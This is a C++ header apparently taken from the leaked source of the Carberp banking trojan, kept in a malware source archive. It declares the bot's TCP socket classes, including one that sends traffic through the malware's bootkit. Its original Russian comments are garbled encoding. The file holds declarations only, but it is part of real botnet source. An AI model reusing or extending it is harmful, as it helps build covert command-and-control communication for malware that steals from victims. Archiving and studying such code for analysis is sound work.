/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
//  ������ ����������� ������ � ��������
//
//  �����: 0.1
//  �������������: ��� 2012
//---------------------------------------------------------------------------

#ifndef BotSocketH
#define BotSocketH
//---------------------------------------------------------------------------


#include <windows.h>
#include "GetApi.h"



class TBotSocket;


//--------------------------------------------------------
//  CreateSocket - ������� ������ ����� ������ � ������-
//			       ����� �� ���������� �������� �������
//  �� ��������� ������������ Windows ������ � ��������
//  ����� TWinSocket
//--------------------------------------------------------
TBotSocket* CreateSocket();

//--------------------------------------------------------
//  CreateBootkitSocket
//  ������� ������ ����� ������, ������� �������� ����� 
//  Bootkit. � ����������� �� �������� ������� ����� 
//  ��������� ������ �� �������� ��������.
//--------------------------------------------------------
TBotSocket* CreateBootkitSocket();



//***************************************************************
//  TSocket - ������� ����� ��� ������ � TCP �������
//***************************************************************
class TBotSocket : public TBotObject
{
protected:
	bool virtual DoConnect(const char *HostName, WORD Port, DWORD Timeout) { return false; }
public:
    virtual ~TBotSocket();

	bool Connect(const char *HostName, WORD Port);
	bool Connect(const char *HostName, WORD Port, DWORD Timeout);
	void virtual Close() {};
	int  virtual Write(const void* Buf, DWORD BufSize)  { return 0; }
    int  virtual Read(void* Buf, DWORD BufSize)         { return 0; }
};




//***************************************************************
//  TWinSocket - ����� ��� ������ � TCP �������
//				 ��������� WinSocket
//***************************************************************
class TWinSocket : public TBotSocket
{
protected:
	bool DoConnect(const char *HostName, WORD Port, DWORD Timeout);
public:
	TWinSocket();
	virtual ~TWinSocket();

	void Close();
	int Write(const void* Buf, DWORD BufSize);
	int Read(void* Buf, DWORD BufSize);

private:
	SOCKET Socket;
};

//***************************************************************
//  TBkSocket - ����� ��� ������ � ������� ��������� Bootkit
//
//***************************************************************
class TBkSocket : public TBotSocket
{
protected:
	bool DoConnect(const char *HostName, WORD Port, DWORD Timeout);
public:
	TBkSocket();
	virtual ~TBkSocket();

	void Close();
	int Write(const void* Buf, DWORD BufSize);
	int Read(void* Buf, DWORD BufSize);

private:
	SOCKET Socket;
};


//---------------------------------------------------------------------------
#endif
